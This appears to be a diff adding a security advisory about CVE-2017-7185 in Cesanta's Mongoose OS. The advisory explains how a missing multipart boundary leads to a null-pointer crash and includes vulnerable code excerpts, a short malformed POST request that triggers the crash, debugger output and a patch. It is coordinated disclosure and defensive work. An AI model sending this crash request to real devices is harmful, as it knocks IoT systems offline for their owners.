@@ -1,0 +1,208 @@
+#############################################################
+#
+# COMPASS SECURITY ADVISORY
+# https://www.compass-security.com/en/research/advisories/
+#
+#############################################################
+#
+# Product: Mongoose OS
+# Vendor: Cesanta
+# CVE ID: CVE-2017-7185
+# CSNC ID: CSNC-2017-003
+# Subject: Use-after-free / Denial of Service
+# Risk: Medium
+# Effect: Remotely exploitable
+# Authors:
+# Philipp Promeuschel <philipp.promeuschel@compass-security.com>
+# Carel van Rooyen <carel.vanrooyen@compass-security.com>
+# Stephan Sekula <stephan.sekula@compass-security.com>
+# Date: 2017-04-03
+#
+#############################################################
+ 
+Introduction:
+-------------
+Cesanta's Mongoose OS [1] - an open source operating system for the Internet of Things. Supported micro controllers:
+* ESP32
+* ESP8266
+* STM32
+* TI CC3200
+ 
+Additionally, Amazon AWS IoT is integrated for Cloud connectivity. Developers can write applications in C or JavaScript (the latter by using the v7 component of Mongoose OS).
+ 
+Affected versions:
+---------
+Vulnerable:
+ * <= Release 1.2
+Not vulnerable:
+ * Patched in current dev / master branch
+Not tested:
+ * N/A
+ 
+Technical Description
+---------------------
+The handling of HTTP-Multipart boundary [3] headers does not properly close connections when malformed requests are sent to the Mongoose server.
+This leads to a use-after-free/null-pointer-de-reference vulnerability, causing the Mongoose HTTP server to crash. As a result, the entire system is rendered unusable.
+ 
+ 
+The mg_parse_multipart [2] function performs proper checks for empty boundaries, but, since the flag "MG_F_CLOSE_IMMEDIATELY" does not have any effect, mg_http_multipart_continue() is called:
+--------------->8---------------
+void mg_http_handler(struct mg_connection *nc, int ev, void *ev_data) {
+[CUT BY COMPASS]
+ #if MG_ENABLE_HTTP_STREAMING_MULTIPART
+     if (req_len > 0 && (s = mg_get_http_header(hm, "Content-Type")) != NULL &&
+         s->len >= 9 && strncmp(s->p, "multipart", 9) == 0) {
+      mg_http_multipart_begin(nc, hm, req_len); // properly checks for empty boundary
+      // however, the socket is not closed, and mg_http_multipart_continue() is executed
+      mg_http_multipart_continue(nc);
+      return;
+}
+---------------8<---------------
+In the mg_http_multipart_begin function, the boundary is correctly verified:
+--------------->8---------------
+  boundary_len =
+      mg_http_parse_header(ct, "boundary", boundary, sizeof(boundary));
+ 
+  if (boundary_len == 0) {
+    /*
+     * Content type is multipart, but there is no boundary,
+     * probably malformed request
+     */
+    nc->flags = MG_F_CLOSE_IMMEDIATELY;
+    DBG(("invalid request"));
+    goto exit_mp;
+  }
+---------------8<---------------
+However, the socket is not closed (even though the flag "MG_F_CLOSE_IMMEDIATELY" has been set), and mg_http_multipart_continue is executed.
+In mg_http_multipart_continue(), the method mg_http_multipart_wait_for_boundary() is executed:
+---------------8<---------------
+static void mg_http_multipart_continue(struct mg_connection *c) {
+  struct mg_http_proto_data *pd = mg_http_get_proto_data(c);
+  while (1) {
+    switch (pd->mp_stream.state) {
+      case MPS_BEGIN: {
+        pd->mp_stream.state = MPS_WAITING_FOR_BOUNDARY;
+        break;
+      }
+      case MPS_WAITING_FOR_BOUNDARY: {
+        if (mg_http_multipart_wait_for_boundary(c) == 0) {
+          return;
+        }
+        break;
+      }
+--------------->8---------------
+Then, mg_http_multipart_wait_for_boundary() tries to identify the boundary-string. However, this string has never been initialized, which causes c_strnstr to crash.
+---------------8<---------------
+static int mg_http_multipart_wait_for_boundary(struct mg_connection *c) {
+  const char *boundary;
+  struct mbuf *io = &c->recv_mbuf;
+  struct mg_http_proto_data *pd = mg_http_get_proto_data(c);
+ 
+  if ((int) io->len < pd->mp_stream.boundary_len + 2) {
+    return 0;
+  }
+ 
+  boundary = c_strnstr(io->buf, pd->mp_stream.boundary, io->len);
+  if (boundary != NULL) {
+[CUT BY COMPASS]
+--------------->8---------------
+ 
+ 
+Steps to reproduce
+-----------------
+Request to HTTP server (code running on hardware device):
+---------------8<---------------
+POST / HTTP/1.1
+Connection: keep-alive
+Content-Type: multipart/form-data;
+Content-Length: 1
+1
+--------------->8---------------
+The above request results in a stack trace on the mongoose console:
+---------------8<---------------
+Guru Meditation Error of type LoadProhibited occurred on core  0. Exception was unhandled.
+Register dump:
+PC      : 0x400014fd  PS      : 0x00060330  A0      : 0x801114b4  A1      : 0x3ffbfcf0 
+A2      : 0x00000000  A3      : 0xfffffffc  A4      : 0x000000ff  A5      : 0x0000ff00 
+A6      : 0x00ff0000  A7      : 0xff000000  A8      : 0x00000000  A9      : 0x00000085 
+A10     : 0xcccccccc  A11     : 0x0ccccccc  A12     : 0x00000001  A13     : 0x00000000 
+A14     : 0x00000037  A15     : 0x3ffbb3cc  SAR     : 0x0000000f  EXCCAUSE: 0x0000001c 
+EXCVADDR: 0x00000000  LBEG    : 0x400014fd  LEND    : 0x4000150d  LCOUNT  : 0xffffffff 
+ 
+Backtrace: 0x400014fd:0x3ffbfcf0 0x401114b4:0x3ffbfd00 0x401136cc:0x3ffbfd30 0x401149ac:0x3ffbfe30 0x40114b71:0x3ffbff00 0x40112b80:0x3ffc00a0 0x40112dc6:0x3ffc00d0 0x40113295:0x3ffc0100 0x4011361a:0x3ffc0170 0x40111716:0x3ffc01d0 0x40103b8f:0x3ffc01f0 0x40105099:0x3ffc0210
+--------------->8---------------
+ 
+ 
+Further debugging shows that an uninitialized string has indeed been passed to c_strnstr:
+---------------8<---------------
+(gdb) info symbol 0x401114b4
+c_strnstr + 12 in section .flash.text
+(gdb) list *0x401114b4
+0x401114b4 is in c_strnstr (/mongoose-os/mongoose/mongoose.c:1720).
+warning: Source file is more recent than executable.
+1715    }
+1716    #endif /* _WIN32 */
+1717   
+1718    /* The simplest O(mn) algorithm. Better implementation are GPLed */
+1719    const char *c_strnstr(const char *s, const char *find, size_t slen) WEAK;
+1720    const char *c_strnstr(const char *s, const char *find, size_t slen) {
+1721      size_t find_length = strlen(find);
+1722      size_t i;
+1723   
+1724      for (i = 0; i < slen; i++) {
+(gdb) list *0x401136cc
+0x401136cc is in mg_http_multipart_continue (/mongoose-os/mongoose/mongoose.c:5893).
+5888      mg_http_free_proto_data_mp_stream(&pd->mp_stream);
+5889      pd->mp_stream.state = MPS_FINISHED;
+5890   
+5891      return 1;
+5892    }
+5893   
+5894    static int mg_http_multipart_wait_for_boundary(struct mg_connection *c) {
+5895      const char *boundary;
+5896      struct mbuf *io = &c->recv_mbuf;
+5897      struct mg_http_proto_data *pd = mg_http_get_proto_data(c);
+(gdb)
+--------------->8---------------
+ 
+Workaround / Fix:
+-----------------
+Apply the following (tested and confirmed) patch:
+---------------8<---------------
+$ diff --git a/mongoose/mongoose.c b/mongoose/mongoose.c
+index 91dc8b9..063f8c6 100644
+--- a/mongoose/mongoose.c
++++ b/mongoose/mongoose.c
+@@ -5889,6 +5889,12 @@ static int mg_http_multipart_wait_for_boundary(struct mg_connection *c) {
+     return 0;
+   }
+  
++  if(pd->mp_stream.boundary == NULL){
++      pd->mp_stream.state = MPS_FINALIZE;
++      LOG(LL_INFO, ("invalid request: boundary not initialized"));
++      return 0;
++  }
++
+   boundary = c_strnstr(io->buf, pd->mp_stream.boundary, io->len);
+   if (boundary != NULL) {
+     const char *boundary_end = (boundary + pd->mp_stream.boundary_len);
+--------------->8---------------
+The patch has been merged into Mongoose OS on github.com on 2017-04-03 [4]
+ 
+Timeline:
+---------
+2017-04-03: Coordinated public disclosure date
+2017-04-03: Release of patch
+2017-03-20: Initial vendor response, code usage sign-off
+2017-03-19: Initial vendor notification
+2017-03-19: Assigned CVE-2017-7185
+2017-03-11: Confirmation and patching Philipp Promeuschel, Carel van Rooyen
+2017-03-08: Initial inspection Philipp Promeuschel, Carel van Rooyen
+2017-03-08: Discovery by Philipp Promeuschel
+ 
+References:
+-----------
+[1] https://www.cesanta.com/
+[2] https://github.com/cesanta/mongoose/blob/66a96410d4336c312de32b1cf5db954aab9ee2ec/mongoose.c#L7760
+[3] http://www.ietf.org/rfc/rfc2046.txt
+[4] https://github.com/cesanta/mongoose-os/commit/042eb437973a202d00589b13d628181c6de5cf5b
